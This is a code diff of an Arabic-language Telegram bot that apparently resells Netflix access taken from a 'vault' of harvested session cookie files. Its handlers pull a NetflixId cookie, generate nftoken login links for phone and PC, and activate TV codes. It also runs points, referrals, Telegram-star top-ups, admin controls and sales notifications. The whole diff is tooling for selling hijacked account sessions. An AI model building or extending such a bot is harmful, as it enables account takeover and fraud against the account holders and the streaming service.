-        [InlineKeyboardButton("📉 تنزيل أدمن", callback_data="admin_demote")],
-        [InlineKeyboardButton("💳 طلبات الشحن", callback_data="admin_topups")],
-        [InlineKeyboardButton("📊 إحصائيات", callback_data="admin_stats")],
-        [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")],
-    ]
-    return InlineKeyboardMarkup(rows)
-
-
-STOP_MARKUP = InlineKeyboardMarkup([
-    [InlineKeyboardButton("🛑 إيقاف", callback_data="stop_check")]
-])
-
-BRAILLE = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
-
-
-async def animate_message(ctx, chat_id, msg_id, stop_event, label="Searching vault..."):
-    idx = 0
-    while not stop_event.is_set():
-        f = BRAILLE[idx % len(BRAILLE)]
-        try:
-            await ctx.bot.edit_message_text(
-                chat_id=chat_id, message_id=msg_id,
-                text=f"{f} {label}"
-            )
-        except Exception:
-            pass
-        idx += 1
-        await asyncio.sleep(0.3)
-
-
-# ============================================================
-# /start — with referral
-# ============================================================
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    msg = update.message
-    uid = msg.from_user.id
-    username = msg.from_user.username
-    args = context.args or []
-
-    new_user = not os.path.exists(USERS_FILE) or str(uid) not in load_users()
-
-    user = get_user(uid)
-    if username:
-        user["username"] = username
-        set_user(uid, user)
-
-    # إحالة
-    if new_user and args and args[0].startswith("ref_"):
-        try:
-            ref_uid = int(args[0][4:])
-            if ref_uid != uid:
-                users = load_users()
-                if str(ref_uid) in users:
-                    users[str(ref_uid)]["points"] = users[str(ref_uid)].get("points", 0) + REFERRAL_POINTS
-                    save_users(users)
-                    user["referrer"] = ref_uid
-                    set_user(uid, user)
-
-                    # أشعر القناة
-                    await notify_channel(context,
-                        f"🎁 <b>إحالة جديدة</b>\n"
-                        f"👤 صديق جديد: <code>{uid}</code>\n"
-                        f"🎯 المحيل: <code>{ref_uid}</code>\n"
-                        f"➕ +{REFERRAL_POINTS} نقطة\n"
-                        f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-                    )
-                    # أشعر المحيل
-                    try:
-                        await context.bot.send_message(
-                            ref_uid,
-                            f"🎁 <b>إحالة جديدة!</b>\n\n"
-                            f"👤 صديقك سجل: <code>{uid}</code>\n"
-                            f"➕ +{REFERRAL_POINTS} نقطة",
-                            parse_mode="HTML"
-                        )
-                    except Exception:
-                        pass
-        except Exception:
-            pass
-
-    user_state[uid] = {"mode": "idle"}
-    price = get_account_price()
-    market = get_market_price()
-    points = user.get("points", 0)
-
-    await msg.reply_html(
-        f"<b>🎬 {STORE_NAME}</b>\n\n"
-        f"👤 <b>مرحبا بك!</b>\n"
-        f"💰 <b>رصيدك:</b> {points} نقطة\n"
-        f"🏷️ <b>سعر الحساب:</b> {price} نقطة (~{market} د.ج)\n\n"
-        f"اختر من الأزرار:",
-        reply_markup=get_main_markup(uid)
-    )
-
-
-# ============================================================
-# BACK / MENU
-# ============================================================
-async def back_home(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    q = update.callback_query
-    uid = q.from_user.id
-    await q.answer()
-    user_state[uid] = {"mode": "idle"}
-
-    user = get_user(uid)
-    price = get_account_price()
-    market = get_market_price()
-
-    txt = (
-        f"<b>🎬 {STORE_NAME}</b>\n\n"
-        f"💰 <b>رصيدك:</b> {user.get('points',0)} نقطة\n"
-        f"🏷️ <b>سعر الحساب:</b> {price} نقطة (~{market} د.ج)\n\n"
-        f"اختر من الأزرار:"
-    )
-    try:
-        await q.edit_message_text(txt, parse_mode="HTML",
-                                  reply_markup=get_main_markup(uid))
-    except Exception:
-        await context.bot.send_message(q.message.chat_id, txt,
-                                       parse_mode="HTML",
-                                       reply_markup=get_main_markup(uid))
-
-
-# ============================================================
-# ACCOUNT / REF LINK
-# ============================================================
-async def my_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    q = update.callback_query
-    uid = q.from_user.id
-    await q.answer()
-
-    user = get_user(uid)
-    users = load_users()
-    referrals = sum(1 for k, v in users.items() if v.get("referrer") == uid)
-
-    txt = (
-        f"👤 <b>حسابي</b>\n\n"
-        f"🆔 <b>ID:</b> <code>{uid}</code>\n"
-        f"💰 <b>النقاط:</b> {user.get('points',0)}\n"
-        f"🎁 <b>الإحالات:</b> {referrals}\n"
-        f"📦 <b>المشتريات:</b> {len(user.get('purchases', []))}\n"
-        f"📅 <b>تاريخ الانضمام:</b> {user.get('joined_at','—')}"
-    )
-    await q.edit_message_text(txt, parse_mode="HTML",
-                              reply_markup=InlineKeyboardMarkup([
-                                  [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")]
-                              ]))
-
-
-async def ref_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    q = update.callback_query
-    uid = q.from_user.id
-    await q.answer()
-
-    bot_username = (await context.bot.get_me()).username
-    link = f"https://t.me/{bot_username}?start=ref_{uid}"
-
-    txt = (
-        f"🎁 <b>رابط الإحالة</b>\n\n"
-        f"<code>{link}</code>\n\n"
-        f"💰 كل صديق يدخل من رابطك = <b>+{REFERRAL_POINTS} نقطة</b>"
-    )
-    await q.edit_message_text(txt, parse_mode="HTML",
-                              reply_markup=InlineKeyboardMarkup([
-                                  [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")]
-                              ]))
-
-
-# ============================================================
-# TOPUP
-# ============================================================
-async def topup(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    q = update.callback_query
-    uid = q.from_user.id
-    await q.answer()
-
-    if has_pending_topup(uid):
-        await q.edit_message_text(
-            "⏳ <b>عندك طلب شحن قيد المراجعة</b>\n\n"
-            f"تواصل مع {TECH_USERNAME} للاستفسار.",
-            parse_mode="HTML",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("📞 تواصل", url=f"https://t.me/{TECH_USERNAME.replace('@','')}")],
-                [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")],
-            ]))
-        return
-
-    cfg = load_config()
-    stars = cfg.get("topup_stars", TOPUP_STARS)
-    points = cfg.get("topup_points", TOPUP_POINTS)
-
-    txt = (
-        f"💰 <b>شحن الرصيد</b>\n\n"
-        f"⭐ المطلوب: <b>{stars} نجمة</b>\n"
-        f"➕ تحصل على: <b>{points} نقطة</b>\n\n"
-        f"<b>خطوات الشحن:</b>\n"
-        f"1. تواصل مع {TECH_USERNAME}\n"
-        f"2. ادفع {stars} نجمة\n"
-        f"3. اضغط زر \"تم الدفع\"\n"
-        f"4. الأدمن يضيف النقاط\n\n"
-        f"📌 سعر الحساب: <b>{get_account_price()} نقطة</b>"
-    )
-    await q.edit_message_text(txt, parse_mode="HTML",
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("📞 تواصل مع الفني", url=f"https://t.me/{TECH_USERNAME.replace('@','')}")],
-            [InlineKeyboardButton("✅ تم الدفع — أرسل الطلب", callback_data="topup_submit")],
-            [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")],
-        ]))
-
-
-async def topup_submit(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    q = update.callback_query
-    uid = q.from_user.id
-    username = q.from_user.username
-    await q.answer()
-
-    if has_pending_topup(uid):
-        await q.edit_message_text("⏳ عندك طلب معلق بالفعل.",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")]
-            ]))
-        return
-
-    create_topup(uid, username)
-    cfg = load_config()
-    stars = cfg.get("topup_stars", TOPUP_STARS)
-
-    await q.edit_message_text(
-        "✅ <b>تم إرسال طلب الشحن</b>\n\n"
-        "⏳ في انتظار موافقة الأدمن.\n"
-        f"💰 المطلوب: {stars} نجمة\n"
-        f"📞 تواصل: {TECH_USERNAME}",
-        parse_mode="HTML",
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("📞 تواصل", url=f"https://t.me/{TECH_USERNAME.replace('@','')}")],
-            [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")],
-        ]))
-
-    # أشعر القناة
-    await notify_channel(context,
-        f"💰 <b>طلب شحن جديد</b>\n"
-        f"━━━━━━━━━━━━━━━━━━\n"
-        f"👤 المستخدم: <code>{uid}</code>\n"
-        f"⭐ المطلوب: {stars} نجمة\n"
-        f"➕ النقاط: {cfg.get('topup_points', TOPUP_POINTS)}\n"
-        f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-    )
-
-
-# ============================================================
-# BUY
-# ============================================================
-async def buy_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    q = update.callback_query
-    uid = q.from_user.id
-    await q.answer()
-
-    user = get_user(uid)
-    price = get_account_price()
-    points = user.get("points", 0)
-
-    if points < price:
-        need = price - points
-        await q.edit_message_text(
-            f"❌ <b>نقاطك غير كافية</b>\n\n"
-            f"💰 رصيدك: <b>{points}</b>\n"
-            f"🏷️ السعر: <b>{price}</b>\n"
-            f"📉 تحتاج: <b>{need}</b> نقطة إضافية",
-            parse_mode="HTML",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("💰 شحن رصيد", callback_data="topup")],
-                [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")],
-            ]))
-        return
-
-    vault = count_vault_cookies()
-    if vault == 0:
-        await q.edit_message_text(
-            "❌ <b>الخزنة فارغة</b>\n\n"
-            "لا توجد حسابات متاحة الآن. حاول لاحقاً.",
-            parse_mode="HTML",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")]
-            ]))
-        return
-
-    txt = (
-        f"🛒 <b>شراء حساب</b>\n\n"
-        f"💰 سعر الحساب: <b>{price} نقطة</b>\n"
-        f"🎯 رصيدك: <b>{points} نقطة</b>\n"
-        f"📦 المتاح: <b>{vault} حساب</b>\n\n"
-        f"اختر نوع التفعيل:"
-    )
-    await q.edit_message_text(txt, parse_mode="HTML",
-                              reply_markup=buy_type_markup())
-
-
-async def buy_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    q = update.callback_query
-    uid = q.from_user.id
-    await q.answer()
-
-    user = get_user(uid)
-    price = get_account_price()
-
-    if user.get("points", 0) < price:
-        await q.answer("❌ نقاطك غير كافية", show_alert=True)
-        return
-
-    vault = count_vault_cookies()
-    if vault == 0:
-        await q.answer("❌ الخزنة فارغة", show_alert=True)
-        return
-
-    status = await q.edit_message_text("🔍 <b>جاري تحضير الحساب...</b>",
-                                        parse_mode="HTML")
-    stop_anim = asyncio.Event()
-    anim_task = asyncio.create_task(
-        animate_message(context, q.message.chat_id, status.message_id,
-                        stop_anim, "Preparing account...")
-    )
-
-    # احصل على حساب
-    result = await asyncio.to_thread(_pull_and_link_cookie)
-
-    stop_anim.set()
-    await asyncio.sleep(0.3)
-    try:
-        anim_task.cancel()
-    except Exception:
-        pass
-
-    if not result["ok"]:
-        await status.edit_text(
-            f"❌ <b>فشل تحضير الحساب</b>\n\n"
-            f"⚠️ {result.get('error','unknown')}\n\n"
-            f"لم يتم خصم أي نقاط.",
-            parse_mode="HTML",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")]
-            ]))
-        return
-
-    # خصم النقاط
-    new_balance = remove_points(uid, price)
-
-    # سجل الشراء
-    user = get_user(uid)
-    purchase = {
-        "type": "phone",
-        "name": result["name"],
-        "email": result["email"],
-        "country": result["country"],
-        "plan": result["plan"],
-        "token": result["token"],
-        "expires": result["expires"],
-        "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-    }
-    user.setdefault("purchases", []).append(purchase)
-    set_user(uid, user)
-
-    txt = (
-        f"✅ <b>تم الشراء بنجاح</b>\n\n"
-        f"👤 <b>الاسم:</b> {result['name']}\n"
-        f"📧 <b>الإيميل:</b> <code>{result['email']}</code>\n"
-        f"🌍 <b>الدولة:</b> {result['country']}\n"
-        f"📦 <b>الخطة:</b> {result['plan']}\n"
-        f"⏰ <b>Expires:</b> {result['expires']}\n\n"
-        f"💰 <b>رصيدك الجديد:</b> {new_balance} نقطة\n\n"
-        f"📱 <b>هاتف:</b>\n"
-        f"<code>https://www.netflix.com/unsupported?nftoken={result['token']}</code>\n\n"
-        f"💻 <b>كمبيوتر:</b>\n"
-        f"<code>https://www.netflix.com/browse?nftoken={result['token']}</code>"
-    )
-    await status.edit_text(txt, parse_mode="HTML",
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("🛒 شراء آخر", callback_data="buy")],
-            [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")],
-        ]))
-
-    # إشعار القناة
-    market = get_market_price()
-    await notify_channel(context,
-        f"🛒 <b>عملية شراء جديدة</b> 🛒\n"
-        f"━━━━━━━━━━━━━━━━━━\n"
-        f"👤 المشتري: <code>{uid}</code>\n"
-        f"📦 الخدمة: حساب المشاهدة (📱 هاتف)\n"
-        f"🔢 العدد: 1\n"
-        f"💰 السعر: {market} د.جزائري\n"
-        f"📅 التاريخ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
-        f"━━━━━━━━━━━━━━━━━━\n"
-        f"🎬 {STORE_NAME} - حسابات جاهزة للتسليم الفوري"
-    )
-
-
-async def buy_tv(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    q = update.callback_query
-    uid = q.from_user.id
-    await q.answer()
-
-    user = get_user(uid)
-    price = get_account_price()
-
-    if user.get("points", 0) < price:
-        await q.answer("❌ نقاطك غير كافية", show_alert=True)
-        return
-
-    vault = count_vault_cookies()
-    if vault == 0:
-        await q.answer("❌ الخزنة فارغة", show_alert=True)
-        return
-
-    user_state[uid] = {"mode": "awaiting_tv_code"}
-    await q.edit_message_text(
-        "📺 <b>تفعيل شاشة TV</b>\n\n"
-        "أرسل كود الشاشة (8 أرقام) المظاهر على تلفازك:",
-        parse_mode="HTML",
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")]
-        ]))
-
-
-async def handle_tv_code_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-    state = user_state.get(uid, {})
-    if state.get("mode") != "awaiting_tv_code":
-        return
-
-    text = update.message.text.strip()
-    code = re.sub(r'\D', '', text)
-    if len(code) != 8:
-        await update.message.reply_text(
-            "❌ الكود لازم 8 أرقام. جرب مرة ثانية:",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("🔙 إلغاء", callback_data="back_home")]
-            ]))
-        return
-
-    user_state[uid]["mode"] = "idle"
-
-    user = get_user(uid)
-    price = get_account_price()
-    if user.get("points", 0) < price:
-        await update.message.reply_text("❌ نقاطك غير كافية")
-        return
-
-    if count_vault_cookies() == 0:
-        await update.message.reply_text("❌ الخزنة فارغة")
-        return
-
-    status = await update.message.reply_text(
-        f"🔍 <b>جاري التفعيل...</b>\n📺 الكود: <code>{code}</code>",
-        parse_mode="HTML")
-    stop_anim = asyncio.Event()
-    anim_task = asyncio.create_task(
-        animate_message(context, update.effective_chat.id, status.message_id,
-                        stop_anim, "Activating TV..."))
-
-    result = await asyncio.to_thread(process_tv_login, code)
-
-    stop_anim.set()
-    await asyncio.sleep(0.3)
-    try:
-        anim_task.cancel()
-    except Exception:
-        pass
-
-    with tv_stats_lock:
-        tv_stats["total_logins"] += 1
-
-    if result.get("success"):
-        with tv_stats_lock:
-            tv_stats["successful"] += 1
-
-        new_balance = remove_points(uid, price)
-        user = get_user(uid)
-        purchase = {
-            "type": "tv",
-            "code": code,
-            "country": result.get("country", "N/A"),
-            "plan": result.get("plan", "N/A"),
-            "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-        }
-        user.setdefault("purchases", []).append(purchase)
-        set_user(uid, user)
-
-        await status.edit_text(
-            f"✅ <b>تم التفعيل!</b>\n\n"
-            f"📺 الكود: <code>{code}</code>\n"
-            f"🌍 الدولة: {result.get('country','N/A')}\n"
-            f"📦 الباقة: {result.get('plan','N/A')}\n\n"
-            f"💰 رصيدك: <b>{new_balance}</b> نقطة",
-            parse_mode="HTML",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")]
-            ]))
-
-        # إشعار القناة
-        market = get_market_price()
-        await notify_channel(context,
-            f"🛒 <b>عملية شراء جديدة</b> 🛒\n"
-            f"━━━━━━━━━━━━━━━━━━\n"
-            f"👤 المشتري: <code>{uid}</code>\n"
-            f"📦 الخدمة: حساب المشاهدة (📺 TV)\n"
-            f"🔢 العدد: 1\n"
-            f"💰 السعر: {market} د.جزائري\n"
-            f"📅 التاريخ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
-            f"━━━━━━━━━━━━━━━━━━\n"
-            f"🎬 {STORE_NAME}"
-        )
-    else:
-        with tv_stats_lock:
-            if result.get("error") == "no_cookies_left":
-                tv_stats["failed"] += 1
-            else:
-                tv_stats["codes_rejected"] += 1
-
-        if result.get("error") == "no_cookies_left":
-            msg = ("😔 <b>الخزنة فارغة</b>\n\n"
-                   "لم يتم خصم أي نقاط. حاول لاحقاً.")
-        else:
-            msg = (f"❌ <b>فشل التفعيل</b>\n\n"
-                   f"⚠️ {result.get('error','unknown')}\n\n"
-                   f"لم يتم خصم أي نقاط.")
-
-        await status.edit_text(msg, parse_mode="HTML",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")]
-            ]))
-
-
 def _pull_and_link_cookie():
-    """يسحب حساب من الخزنة ويولّد nftoken"""
-    attempts = 0
-    while attempts < 10:
-        attempts += 1
+    for _ in range(10):
         filename, content = get_random_cookie_file()
         if not filename:
-            return {"ok": False, "error": "الخزنة فارغة"}
+            return {"ok": False, "error": "vault_empty"}
         ck = extract_cookie_dict_tv(content)
         if not ck or not ck.get('NetflixId'):
             continue
@@ -1309,7 +851,431 @@ def _pull_and_link_cookie():
             "token": tok["token"],
             "expires": tok["expires"],
         }
-    return {"ok": False, "error": "لم يتم العثور على حساب فعّال"}
+    return {"ok": False, "error": "no_premium"}
+
+
+# ============================================================
+# NOTIFICATIONS
+# ============================================================
+async def notify_channel(context, text):
+    try:
+        await context.bot.send_message(chat_id=CHANNEL_ID, text=text, parse_mode="HTML")
+    except Exception as e:
+        log.warning("channel notify failed: %s", e)
+
+
+# ============================================================
+# MARKUPS — أزرار عرضية
+# ============================================================
+def get_main_markup(uid):
+    rows = [
+        [
+            InlineKeyboardButton(t(uid, "buy"), callback_data="buy"),
+            InlineKeyboardButton(t(uid, "topup"), callback_data="topup"),
+        ],
+        [
+            InlineKeyboardButton(t(uid, "ref"), callback_data="ref_link"),
+            InlineKeyboardButton(t(uid, "purchases"), callback_data="my_purchases"),
+        ],
+        [
+            InlineKeyboardButton(t(uid, "account"), callback_data="my_account"),
+            InlineKeyboardButton(t(uid, "support"), url=f"https://t.me/{TECH_USERNAME.replace('@','')}"),
+        ],
+        [
+            InlineKeyboardButton(t(uid, "lang"), callback_data="change_lang"),
+        ],
+    ]
+    if is_admin(uid):
+        rows.append([InlineKeyboardButton(t(uid, "admin"), callback_data="admin_panel")])
+    return InlineKeyboardMarkup(rows)
+
+
+def lang_markup():
+    return InlineKeyboardMarkup([
+        [
+            InlineKeyboardButton("🇸🇦 العربية", callback_data="setlang_ar"),
+            InlineKeyboardButton("🇫🇴 English", callback_data="setlang_en"),
+            InlineKeyboardButton("🇫🇷 Français", callback_data="setlang_fr"),
+        ]
+    ])
+
+
+def buy_type_markup(uid):
+    return InlineKeyboardMarkup([
+        [
+            InlineKeyboardButton(t(uid, "phone"), callback_data="buy_phone"),
+            InlineKeyboardButton(t(uid, "tv"), callback_data="buy_tv"),
+        ],
+        [InlineKeyboardButton(t(uid, "back"), callback_data="back_home")],
+    ])
+
+
+def admin_markup(uid):
+    return InlineKeyboardMarkup([
+        [
+            InlineKeyboardButton(t(uid, "check"), callback_data="admin_check"),
+            InlineKeyboardButton(t(uid, "clear"), callback_data="admin_clear"),
+        ],
+        [
+            InlineKeyboardButton(t(uid, "price"), callback_data="admin_set_price"),
+            InlineKeyboardButton(t(uid, "market"), callback_data="admin_set_market"),
+        ],
+        [
+            InlineKeyboardButton(t(uid, "addp"), callback_data="admin_add_points"),
+            InlineKeyboardButton(t(uid, "remp"), callback_data="admin_remove_points"),
+        ],
+        [
+            InlineKeyboardButton(t(uid, "promote"), callback_data="admin_promote"),
+            InlineKeyboardButton(t(uid, "demote"), callback_data="admin_demote"),
+        ],
+        [
+            InlineKeyboardButton(t(uid, "topups"), callback_data="admin_topups"),
+            InlineKeyboardButton(t(uid, "stats"), callback_data="admin_stats"),
+        ],
+        [InlineKeyboardButton(t(uid, "back"), callback_data="back_home")],
+    ])
+
+
+BRAILLE = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
+
+
+async def animate_message(ctx, chat_id, msg_id, stop_event, label="..."):
+    idx = 0
+    while not stop_event.is_set():
+        f = BRAILLE[idx % len(BRAILLE)]
+        try:
+            await ctx.bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=f"{f} {label}")
+        except Exception:
+            pass
+        idx += 1
+        await asyncio.sleep(0.3)
+
+
+# ============================================================
+# /start
+# ============================================================
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    msg = update.message
+    uid = msg.from_user.id
+    username = msg.from_user.username
+    args = context.args or []
+
+    new_user = str(uid) not in load_users()
+    user = get_user(uid)
+    if username:
+        user["username"] = username
+        set_user(uid, user)
+
+    if new_user and args and args[0].startswith("ref_"):
+        try:
+            ref_uid = int(args[0][4:])
+            if ref_uid != uid:
+                users = load_users()
+                if str(ref_uid) in users:
+                    users[str(ref_uid)]["points"] = users[str(ref_uid)].get("points", 0) + REFERRAL_POINTS
+                    save_users(users)
+                    user["referrer"] = ref_uid
+                    set_user(uid, user)
+                    await notify_channel(context,
+                        f"🎁 <b>إحالة جديدة</b>\n👤 <code>{uid}</code> → <code>{ref_uid}</code>\n➕ +{REFERRAL_POINTS}")
+                    try:
+                        await context.bot.send_message(ref_uid,
+                            f"🎁 +{REFERRAL_POINTS} نقطة (إحالة)",
+                            parse_mode="HTML")
+                    except Exception:
+                        pass
+        except Exception:
+            pass
+
+    user_state[uid] = {"mode": "idle"}
+
+    if new_user or not user.get("lang"):
+        await msg.reply_html(TEXTS["ar"]["choose_lang"], reply_markup=lang_markup())
+        return
+
+    lang = user.get("lang", "ar")
+    await msg.reply_html(
+        TEXTS[lang]["welcome"].format(
+            name=msg.from_user.first_name or "User",
+            points=user.get("points", 0),
+            price=get_account_price(),
+            market=get_market_price(),
+        ),
+        reply_markup=get_main_markup(uid))
+
+
+# ============================================================
+# BACK
+# ============================================================
+async def back_home(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query
+    uid = q.from_user.id
+    await q.answer()
+    user_state[uid] = {"mode": "idle"}
+    user = get_user(uid)
+    lang = user.get("lang", "ar")
+    txt = TEXTS[lang]["welcome"].format(
+        name=q.from_user.first_name or "User",
+        points=user.get("points", 0),
+        price=get_account_price(),
+        market=get_market_price(),
+    )
+    try:
+        await q.edit_message_text(txt, parse_mode="HTML", reply_markup=get_main_markup(uid))
+    except Exception:
+        await context.bot.send_message(q.message.chat_id, txt, parse_mode="HTML", reply_markup=get_main_markup(uid))
+
+
+# ============================================================
+# ACCOUNT / REF
+# ============================================================
+async def my_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query
+    uid = q.from_user.id
+    await q.answer()
+    user = get_user(uid)
+    users = load_users()
+    referrals = sum(1 for k, v in users.items() if v.get("referrer") == uid)
+    txt = t(uid, "acc_info",
+            uid=uid, points=user.get('points', 0),
+            refs=referrals, purchases=len(user.get('purchases', [])),
+            joined=user.get('joined_at', '—'))
+    await q.edit_message_text(txt, parse_mode="HTML",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="back_home")]]))
+
+
+async def ref_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query
+    uid = q.from_user.id
+    await q.answer()
+    bot_username = (await context.bot.get_me()).username
+    link = f"https://t.me/{bot_username}?start=ref_{uid}"
+    await q.edit_message_text(
+        t(uid, "ref_info", link=link, points=REFERRAL_POINTS),
+        parse_mode="HTML",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="back_home")]]))
+
+
+# ============================================================
+# TOPUP
+# ============================================================
+async def topup(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query
+    uid = q.from_user.id
+    await q.answer()
+    if has_pending_topup(uid):
+        await q.edit_message_text(
+            t(uid, "pending_topup", tech=TECH_USERNAME), parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("📞", url=f"https://t.me/{TECH_USERNAME.replace('@','')}")],
+                [InlineKeyboardButton(t(uid, "back"), callback_data="back_home")],
+            ]))
+        return
+    cfg = load_config()
+    await q.edit_message_text(
+        t(uid, "topup_info",
+          stars=cfg.get("topup_stars", TOPUP_STARS),
+          points=cfg.get("topup_points", TOPUP_POINTS),
+          tech=TECH_USERNAME),
+        parse_mode="HTML",
+        reply_markup=InlineKeyboardMarkup([
+            [InlineKeyboardButton("📞 " + TECH_USERNAME, url=f"https://t.me/{TECH_USERNAME.replace('@','')}")],
+            [InlineKeyboardButton("✅ " + ("تم الدفع" if get_user(uid).get("lang")=="ar" else "Paid"), callback_data="topup_submit")],
+            [InlineKeyboardButton(t(uid, "back"), callback_data="back_home")],
+        ]))
+
+
+async def topup_submit(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query
+    uid = q.from_user.id
+    await q.answer()
+    if has_pending_topup(uid):
+        await q.edit_message_text(t(uid, "already_pending"),
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="back_home")]]))
+        return
+    create_topup(uid, q.from_user.username)
+    cfg = load_config()
+    await q.edit_message_text(
+        t(uid, "topup_sent") + f"\n\n⭐ {cfg.get('topup_stars', TOPUP_STARS)}\n📞 {TECH_USERNAME}",
+        parse_mode="HTML",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="back_home")]]))
+    await notify_channel(context,
+        f"💰 <b>طلب شحن جديد</b>\n👤 <code>{uid}</code>\n⭐ {cfg.get('topup_stars', TOPUP_STARS)}\n📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+
+
+# ============================================================
+# BUY
+# ============================================================
+async def buy_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query
+    uid = q.from_user.id
+    await q.answer()
+    user = get_user(uid)
+    price = get_account_price()
+    points = user.get("points", 0)
+    if points < price:
+        await q.edit_message_text(
+            t(uid, "insufficient", points=points, price=price, need=price-points),
+            parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton(t(uid, "topup"), callback_data="topup")],
+                [InlineKeyboardButton(t(uid, "back"), callback_data="back_home")],
+            ]))
+        return
+    vault = count_vault_cookies()
+    if vault == 0:
+        await q.edit_message_text(t(uid, "vault_empty"), parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="back_home")]]))
+        return
+    await q.edit_message_text(
+        t(uid, "buy_choose", price=price, points=points, vault=vault),
+        parse_mode="HTML", reply_markup=buy_type_markup(uid))
+
+
+async def buy_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query
+    uid = q.from_user.id
+    await q.answer()
+    user = get_user(uid)
+    price = get_account_price()
+    if user.get("points", 0) < price:
+        await q.answer("❌", show_alert=True); return
+    if count_vault_cookies() == 0:
+        await q.answer("❌", show_alert=True); return
+
+    status = await q.edit_message_text("⏳", parse_mode="HTML")
+    stop_anim = asyncio.Event()
+    anim = asyncio.create_task(animate_message(context, q.message.chat_id, status.message_id, stop_anim, t(uid, "processing")))
+    result = await asyncio.to_thread(_pull_and_link_cookie)
+    stop_anim.set()
+    await asyncio.sleep(0.2)
+    try: anim.cancel()
+    except Exception: pass
+
+    if not result["ok"]:
+        await status.edit_text(t(uid, "vault_empty"), parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="back_home")]]))
+        return
+
+    new_balance = remove_points(uid, price)
+    user = get_user(uid)
+    purchase = {
+        "type": "phone", "name": result["name"], "email": result["email"],
+        "country": result["country"], "plan": result["plan"],
+        "token": result["token"], "expires": result["expires"],
+        "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+    }
+    user.setdefault("purchases", []).append(purchase)
+    set_user(uid, user)
+
+    phone_url = f"https://www.netflix.com/unsupported?nftoken={result['token']}"
+    pc_url = f"https://www.netflix.com/browse?nftoken={result['token']}"
+
+    await status.edit_text(
+        t(uid, "buy_success",
+          name=result['name'], email=result['email'], country=result['country'],
+          plan=result['plan'], expires=result['expires'], balance=new_balance,
+          phone_url=phone_url, pc_url=pc_url),
+        parse_mode="HTML",
+        reply_markup=InlineKeyboardMarkup([
+            [InlineKeyboardButton(t(uid, "buy"), callback_data="buy")],
+            [InlineKeyboardButton(t(uid, "back"), callback_data="back_home")],
+        ]))
+
+    market = get_market_price()
+    await notify_channel(context,
+        f"🛒 <b>عملية شراء جديدة</b> 🛒\n"
+        f"━━━━━━━━━━━━━━━━━━\n"
+        f"👤 المشتري: <code>{uid}</code>\n"
+        f"📦 الخدمة: حساب المشاهدة (📱 هاتف)\n"
+        f"🔢 العدد: 1\n"
+        f"💰 السعر: {market} د.جزائري\n"
+        f"📅 التاريخ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
